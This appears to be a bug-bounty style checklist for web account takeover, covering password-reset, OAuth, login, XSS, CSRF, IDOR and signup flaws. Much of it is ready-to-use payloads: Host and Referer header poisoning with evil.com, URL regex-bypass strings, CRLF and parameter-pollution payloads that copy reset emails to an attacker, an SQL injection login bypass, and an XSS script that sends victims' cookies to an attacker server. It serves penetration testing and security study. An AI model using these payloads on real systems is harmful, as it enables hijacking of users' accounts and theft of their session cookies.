# ATO

\[ ] **password reset**

* **try sqli**

**Host Header Manipulation**

* **Host Header Poisoning**
  * Example: `Host: evil.com`
* **Load Balancer Host Header Override**
  * Example: `Host: target.com`, `X-Forwarded-Host: evil.com`
  * **Description:** If a load balancer is present, it may modify the Host header, allowing the attacker to control or manipulate the request.

#### &#x20;**Sensitive Information Leakage**

* **Check for Leakages:** Inspect server responses for sensitive information, such as reset password tokens that may inadvertently be exposed.

#### &#x20;**Header Poisoning**

* **Referer Header Poisoning**
  * Example: `Referer: evil.com`
* **Origin Header Poisoning**
  * Example: `ORIGIN: evil.com`

#### &#x20;**Bypassing Regular Expressions**

* Craft payloads that may bypass security checks:
  * `target.com.evil.com`
  * `eviltarget.com`
  * `evil.com/target.com`
  * `evil.com%23@target.com`
  * `evil.com%25%32%33@target.com`

#### **SMTP Injection & HTTP Parameter Pollution**

* **Example Payloads:**

```json
{
  "email": "Victim@gmail.com,Attacker@gmail.com",
  "email": "Victim@gmail.com"
}
```

```json
{
  "email": "Victim@gmail.com",
  "email": "Victim@gmail.com,Attacker@gmail.com"
}
```

#### **CRLF Injection with HPP**

**Unix Line Endings**

* **Carbon Copy (CC) with HPP Chain:**

```json
{
  "email": "Victim@mail.com%0Acc:Attacker@mail.com",
  "email": "Victim@mail.com"
}
```

```json
{
  "email": "Victim@mail.com",
  "email": "Victim@mail.com%0Acc:Attacker@mail.com"
}
```

**Blind Carbon Copy (BCC) with HPP Chain**

```json
{
  "email": "Victim@mail.com%0Abcc:Attacker@mail.com",
  "email": "Victim@mail.com"
}
```

```json
{
  "email": "Victim@mail.com",
  "email": "Victim@mail.com%0Abcc:Attacker@mail.com"
}
```

&#x20;**Windows Line Endings**

**Carbon Copy (CC) with HPP Chain**

```json
{
  "email": "Victim@mail.com%0D%0Acc:Attacker@mail.com",
  "email": "Victim@mail.com"
}
```

```json
{
  "email": "Victim@mail.com",
  "email": "Victim@mail.com%0D%0Acc:Attacker@mail.com"
}
```

**Blind Carbon Copy (BCC) with HPP Chain**

```json
{
  "email": "Victim@mail.com%0D%0Abcc:Attacker@mail.com",
  "email": "Victim@mail.com"
}
```

```json
{
  "email": "Victim@mail.com",
  "email": "Victim@mail.com%0D%0Abcc:Attacker@mail.com"
}
```

#### &#x20;**Array of Emails**

* **Example Payload:**

  ```json
  {
    "email": ["victim@mail.com", "attacker@mail.com"]
  }
  ```

**Parameter Bruteforce using Arjun**

```python
params = open("Arjun/arjun/db/large.txt", "r").readlines()
params = set(params)
NewParams = set()

for param in params:
    NewParams.add('"' + param.strip() + '"' + ":" + '"' + param.strip() + '\'!@#$%^&*)(?><",')

NewParamsFile = open("new-params", "w")
for param in NewParams:
    NewParamsFile.write(param + "\n")

```

\[ ] **OAuth to Account takeover**

```javascript
OAuth to Account Takeover
Redirect_URI: Open redirect, XSS, LFI
Email Parameter: Check the request after confirming your email. If it contains the email parameter, try changing it to verify another account.
CSRF: If the state parameter is not implemented or validated properly, it can lead to CSRF.
Client Secret Exposure & Weak Cryptography
Leaking Authorization Code or Token: Check for leaks in the Referer header.
Access Token in Browser History: If it's in the URL, it can be exploited.
No Expiration Code
SSRF: Via logo_uri, jwks_uri, sector_identifier_uri.
```

\[ ] **Pre-Account Takeover**

A pre-account takeover occurs when an attacker creates a user account using one signup method, and the victim creates another account using a different signup method with the same email address. This can happen if the application fails to validate email addresses properly.

```javascript
How to Hunt:
1. Try registering any email address without verifying it.
2. Try registering an account again, but this time with a different method (e.g., "Sign up with Google") using the same email address.
3. Since both accounts are linked, attempt to log in with the specified password and username to see if you can access information from the Google-linked account.
```

\[ ] **Account takeover by utilizing sensitive data exposure**

```javascript
Sensitive data exposure occurs when a web application failed to properly protect confidential information, resulting in the disclosure of sensitive information or data about users, or anything related to them, to a third party.

Occasionally, the application displays unnecessary data, such as valid OTPs, hashes, or passwords, over the request and response parts. So it’s a good idea to pay attention to the response and request portions.
```

\[ ] **login**

````javascript
1. check if you are able to brute force the password
2. Test for OAuth misconfigurations
3. check if you are able to bruteforce the login OTP
4. check for JWT mesconfigurations
5. Test for SQL injection to bypass authentication ```admin" or 1=1;--```
6. check if the application validates the OTP or Token if
````

\[ ] **XSS to Account Takeover**

if the application does not use auth token or you can't access the cookies because the "HttpOnly" flag, you can obtain the CSRF token and craft a request to change the user's email or password

````markup
1. try to exfiltrate the cookies
2. try to exfiltrate the Auth Token
3. if the cookie's "domain" attribute is set, search for xss in the subdomains and use it to exfiltrate the cookies
    - PoC Example:
        ```html
        
        <script>
            /*
            this script will create a hidden <img> element
            when the browser tries to load the image
            the victim's cookies will be sent to your server
            */

            var new_img = document.createElement('img');
            new_img.src = "http://yourserver/" + document.cookie;
            new_img.style = 'display: none;'
            document.body.appendChild(new_img);
        </script>

        ```
````

\[ ] **CSRF to Account Takeover**

```javascript
1. check if the email update endpoint is vulnerable to CSRF
2. check if the password change endpoint is vulnerable to CSRF
```

\[ ] **IDOR to Account Takerover**

```javascript
1. checck if the email update endpoint is vulnerable to IDOR
2. check if the password change endpoint is vulnerable to IDOR
3. check if the password reset endpoint vulnerable to IDOR
```

\[ ] **Account takeover by Response & Status code Manipulation**

\[ ] **Account takeover by exploiting Weak cryptography**

* **check the cryptography algorthim in the token of reset password**

\[ ] **Password or email change function**

```
IF you try to change password and see email parameter in password change request, Try changing your email to victim email
```

\[ ] **Sing-Up Function**

```
IF you try to sing-up new account in target site, in email filed try set target email

IF you try to sing-up new account in target site using 3rd party, in 3d party use phone number instead email then link 3rd account with target site.Then Go setting try link victim email in you account
```

\[ ] **Rest Token**

```
Try to use your REST Token with Target account. Hint: email=Target@email.com&code=$Attacker_TOKEN$

Brute Force Rest Token if it is numeric. Hint : email=Target@email.com&code=$TOKEN$

Try to figure out how the token are generated: 1. Generated based on TimeStamp OR ID of user OR email of user
```

\[ ] **Host Header Injection**

```
when send rest account request intercept POST Request and Change Host header value from target.site TO Attacker.com: Hint POST /PassRest HTTP1/1 Host: Attacker.com
```

\[ ] **CORS Misconfiguration to Account Takeover**

If the page contains CORS missconfigurations you might be able to steal sensitive information from the user to takeover his account or make him change auth information for the same purpose:

```
https://book.hacktricks.xyz/pentesting-web/cors-bypass
```

\[ ] **Account takeover via leaked session cookie**

```
https://hackerone.com/reports/745324
```

\[ ] **HTTP Request Smuggling to ATO**

```
https://hackerone.com/reports/737140
https://hackerone.com/reports/740037
```

\[ ] **Bypassing Digits origin validation which leads to account takeover**

```
https://hackerone.com/reports/129873
```

\[ ] Top ATO report in hackerone

```
https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPACCOUNTTAKEOVER.md
```
